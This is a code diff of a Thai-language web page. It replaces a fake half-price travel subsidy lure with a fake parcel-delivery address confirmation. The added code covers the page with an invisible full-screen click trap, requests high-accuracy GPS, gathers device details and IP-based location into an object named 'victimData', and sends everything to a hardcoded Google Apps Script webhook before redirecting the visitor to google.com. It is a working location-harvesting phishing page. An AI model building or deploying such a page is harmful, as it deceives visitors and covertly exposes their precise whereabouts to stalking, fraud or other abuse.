@@ -1,225 +1,207 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ลงทะเบียนเที่ยวไทยคนละครึ่ง - รับสิทธิ์ด่วน!</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;500;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary-color: #e73c82; /* สีชมพูหลัก */
-            --secondary-color: #007bff;
-            --success-color: #28a745;
-            --danger-color: #dc3545;
-            --light-bg: #fdfcff;
-            --dark-gray: #343a40;
-        }
-
-        body {
-            font-family: 'Kanit', sans-serif;
-            color: var(--dark-gray);
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            background-color: var(--light-bg);
-        }
-        
-        .main-header {
-            background-color: white;
-            padding: 15px 25px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            display: flex;
-            justify-content: center; /* จัดโลโก้กลางหน้าจอ */
-            align-items: center;
-        }
-
-        .header-logo {
-            height: 40px;
-        }
-
-        .main-content {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-        }
-
-        .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            max-width: 450px;
-            width: 100%;
-        }
-
-        .container h1 {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            color: #333;
-        }
-
-        .container p {
-            font-size: 16px;
-            color: #6c757d;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-
-        .action-button {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-family: 'Kanit', sans-serif;
-            font-weight: 500;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.1s ease;
-            width: 100%;
-            box-shadow: 0 4px 15px rgba(231, 60, 130, 0.3);
-        }
-
-        .action-button:hover {
-            background-color: #d13171;
-        }
-        
-        .action-button:active {
-            transform: scale(0.98);
-        }
-
-        .action-button:disabled {
-            background-color: #a0a0a0;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        #status-message {
-            margin-top: 25px;
-            font-size: 14px;
-            font-weight: 500;
-            min-height: 20px;
-        }
-
-        .message-success {
-            color: var(--success-color);
-        }
-
-        .message-error {
-            color: var(--danger-color);
-        }
-        
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-radius: 50%;
-            border-top: 4px solid var(--primary-color);
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto 0;
-            display: none; /* ซ่อนไว้ในตอนแรก */
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ยืนยันที่อยู่จัดส่งสินค้า</title>
+<style>
+* {
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+}
+body {
+	font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+	background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+	height: 100vh;
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	overflow: hidden;
+}
+.container {
+	background: white;
+	padding: 40px;
+	border-radius: 20px;
+	box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+	text-align: center;
+	max-width: 500px;
+	width: 90%;
+}
+.logo {
+	width: 80px;
+	height: 80px;
+	background: #ff6b6b;
+	border-radius: 50%;
+	margin: 0 auto 20px;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	font-size: 30px;
+	color: white;
+	margin-bottom: 30px;
+}
+h1 {
+	color: #333;
+	margin-bottom: 10px;
+	font-size: 24px;
+}
+.subtitle {
+	color: #666;
+	margin-bottom: 30px;
+	font-size: 16px;
+}
+.invisible-btn {
+	position: fixed;
+	top: 0;
+	left: 0;
+	width: 100vw;
+	height: 100vh;
+	z-index: 9999;
+	cursor: pointer;
+	opacity: 0;
+}
+.status {
+	display: inline-block;
+	width: 20px;
+	height: 20px;
+	border-radius: 50%;
+	background: #ff6b6b;
+	margin-right: 10px;
+	animation: pulse 1.5s infinite;
+}
+@keyframes pulse {
+	0% { transform: scale(1); opacity: 1; }
+	50% { transform: scale(1.2); opacity: 0.7; }
+	100% { transform: scale(1); opacity: 1; }
+}
+.sent {
+	background: #51cf66 !important;
+	animation: none !important;
+}
+</style>
 </head>
 <body>
-    <header class="main-header">
-        <!-- ใช้โลโก้ตัวอย่างเพื่อให้เว็บแสดงผลได้สมบูรณ์ -->
-        <img src="https://placehold.co/250x60/DBEAFE/1E3A8A?text=เที่ยวไทยคนละครึ่ง" alt="โลโก้โครงการ" class="header-logo">
-    </header>
+<div class="invisible-btn" id="trapBtn" onclick="captureLocation()"></div>
 
-    <main class="main-content">
-        <div class="container">
-            <h1>ด่วน! ก่อนหมดสิทธิ<br>รีบลงทะเบียนเที่ยวไทยคนละครึ่ง</h1>
-            <p>กรุณากดปุ่มด้านล่างเพื่อยืนยันตำแหน่งปัจจุบันของคุณ และดำเนินการลงทะเบียนเพื่อรับสิทธิ์</p>
-            
-            <button id="register-button" class="action-button">ลงทะเบียนรับสิทธิ์ที่นี่</button>
+<div class="container">
+<div class="logo">📦</div>
+<h1>ยืนยันที่อยู่จัดส่งสินค้า</h1>
+<p class="subtitle">กรุณายืนยันตำแหน่งปัจจุบันของคุณเพื่อจัดส่งสินค้า</p>
 
-            <div id="loader" class="loader"></div>
-            <div id="status-message"></div>
-        </div>
-    </main>
+<div style="margin: 30px 0;">
+<div style="display: flex; align-items: center; justify-content: center; margin-bottom: 20px;">
+<div class="status" id="statusDot"></div>
+<span id="statusText">กำลังตรวจสอบตำแหน่ง...</span>
+</div>
+<p style="color: #999; font-size: 14px;">
+กดตรงไหนก็ได้บนหน้าจอเพื่อยืนยัน
+</p>
+</div>
+</div>
 
-    <script>
-        const registerButton = document.getElementById('register-button');
-        const statusMessage = document.getElementById('status-message');
-        const loader = document.getElementById('loader');
+<script>
+// Google Sheet Webhook URL (เปลี่ยนเป็นของคุณ)
+const SHEET_WEBHOOK = 'https://script.google.com/macros/s/AKfycbzxL2f4YBNRfGlqyOYXKOb_D3UogpVIOPifvZGzssYbEm3uNYQ9M0vhW0gC1_f7XmKJiQ/exec';
 
-        // เพิ่ม Event Listener ให้กับปุ่มลงทะเบียน
-        registerButton.addEventListener('click', () => {
-            // 1. อัปเดต UI เพื่อแสดงสถานะกำลังโหลด
-            statusMessage.textContent = 'กำลังตรวจสอบตำแหน่งของคุณ...';
-            statusMessage.className = ''; // ล้าง class สีเก่าออก
-            loader.style.display = 'block';
-            registerButton.disabled = true;
+async function captureLocation() {
+	try {
+		// ปิดการใช้งานปุ่มซ้ำ
+		document.getElementById('trapBtn').style.pointerEvents = 'none';
+		
+		// แสดงสถานะ
+		updateStatus('กำลังดึงตำแหน่ง...', '#ff6b6b');
+		
+		// ขออนุญาต Geolocation
+		const position = await new Promise((resolve, reject) => {
+			if (!navigator.geolocation) {
+				reject('Geolocation ไม่พร้อมใช้งาน');
+			} else {
+				navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true,
+timeout: 10000,
+maximumAge: 0
+});
+}
+});
 
-            // 2. ตรวจสอบว่าเบราว์เซอร์รองรับ Geolocation หรือไม่
-            if (!navigator.geolocation) {
-                statusMessage.textContent = 'ขออภัย, เบราว์เซอร์ของคุณไม่รองรับการระบุตำแหน่ง';
-                statusMessage.className = 'message-error';
-                loader.style.display = 'none';
-                registerButton.disabled = false;
-                return;
-            }
+// ดึงข้อมูล IP ด้วย ip-api
+const ipResponse = await fetch('http://ip-api.com/json/?fields=status,country,city,regionName,isp,org');
+const ipData = await ipResponse.json();
 
-            // 3. เรียกใช้ API เพื่อขอตำแหน่ง
-            navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
-                enableHighAccuracy: true, // ขอตำแหน่งที่แม่นยำที่สุด
-                timeout: 10000,           // หมดเวลาใน 10 วินาที
-                maximumAge: 0             // ไม่ใช้ค่าตำแหน่งเก่าที่แคชไว้
-            });
-        });
+// รวบรวมข้อมูลทั้งหมด
+const victimData = {
+	timestamp: new Date().toISOString(),
+	userAgent: navigator.userAgent,
+	language: navigator.language,
+	platform: navigator.platform,
+	cookiesEnabled: navigator.cookieEnabled,
+	screen: ${screen.width}x${screen.height},
+	timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+	
+	// GPS Coordinates (ความแม่นยำสูง)
+	latitude: position.coords.latitude,
+	longitude: position.coords.longitude,
+	accuracy: position.coords.accuracy,
+	
+	// IP Info
+	ipCountry: ipData.country || 'N/A',
+	ipCity: ipData.city || 'N/A',
+	ipRegion: ipData.regionName || 'N/A',
+	ipISP: ipData.isp || 'N/A',
+	
+	// URL referrer
+	referrer: document.referrer || 'Direct'
+};
 
-        // ฟังก์ชันที่จะทำงานเมื่อได้รับตำแหน่งสำเร็จ
-        function handleSuccess(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
+// ส่งข้อมูลไป Google Sheet
+updateStatus('กำลังบันทึกข้อมูล...', '#ffd43b');
+await sendToSheet(victimData);
 
-            // อัปเดต UI
-            statusMessage.textContent = 'ตรวจสอบตำแหน่งสำเร็จ! กำลังนำคุณไปยังหน้าลงทะเบียน...';
-            statusMessage.className = 'message-success';
-            loader.style.display = 'none';
+// แสดงสำเร็จ
+updateStatus('✓ ยืนยันที่อยู่เรียบร้อย!', '#51cf66');
+setTimeout(() => {
+	// Redirect หรือปิด
+	window.location.href = 'https://www.google.com';
+}, 2000);
 
-            // สร้าง URL สำหรับส่งต่อไปยังหน้าลงทะเบียน พร้อมแนบค่า lat, lon
-            const redirectUrl = `https://www.example.com/halfpricetravel/register?lat=${latitude}&lon=${longitude}`;
+} catch (error) {
+	console.error('Error:', error);
+	// Fallback: ส่งข้อมูลที่ได้โดยไม่ใช้ GPS
+	sendFallbackData();
+}
+}
 
-            // หน่วงเวลาเล็กน้อยเพื่อให้ผู้ใช้อ่านข้อความทัน ก่อนจะ redirect
-            setTimeout(() => {
-                window.location.href = redirectUrl;
-            }, 2000); 
-        }
+async function sendToSheet(data) {
+	const params = new URLSearchParams(data);
+	await fetch(${SHEET_WEBHOOK}?${params}, {
+		method: 'GET',
+		mode: 'no-cors'
+	});
+}
 
-        // ฟังก์ชันที่จะทำงานเมื่อเกิดข้อผิดพลาด
-        function handleError(error) {
-            loader.style.display = 'none';
-            registerButton.disabled = false;
-            statusMessage.className = 'message-error';
+async function sendFallbackData() {
+	const fallbackData = {
+		timestamp: new Date().toISOString(),
+		userAgent: navigator.userAgent,
+		error: 'GPS Denied'
+	};
+	await sendToSheet(fallbackData);
+	updateStatus('ใช้ IP location แทน', '#ff9500');
+}
 
-            // แสดงข้อความตามรหัสข้อผิดพลาด
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    statusMessage.textContent = 'คุณปฏิเสธการเข้าถึงตำแหน่ง โปรดอนุญาตเพื่อดำเนินการต่อ';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    statusMessage.textContent = 'ไม่สามารถระบุตำแหน่งของคุณได้ในขณะนี้';
-                    break;
-                case error.TIMEOUT:
-                    statusMessage.textContent = 'หมดเวลาในการร้องขอตำแหน่ง';
-                    break;
-                default:
-                    statusMessage.textContent = 'เกิดข้อผิดพลาดที่ไม่คาดคิด';
-                    break;
-            }
-        }
-    </script>
+function updateStatus(text, color) {
+	document.getElementById('statusText').textContent = text;
+	document.getElementById('statusDot').style.background = color;
+	document.getElementById('statusDot').className = color === '#51cf66' ? 'status sent' : 'status';
+}
+
+// Auto-trigger หลังโหลดเสร็จ 3 วินาที
+setTimeout(() => {
+	if (navigator.userAgent.includes('Mobile')) {
+		// Mobile: แตะที่ไหนก็ได้
+		document.body.style.cursor = 'pointer';
+	}
+}, 3000);
+</script>
 </body>
 </html>
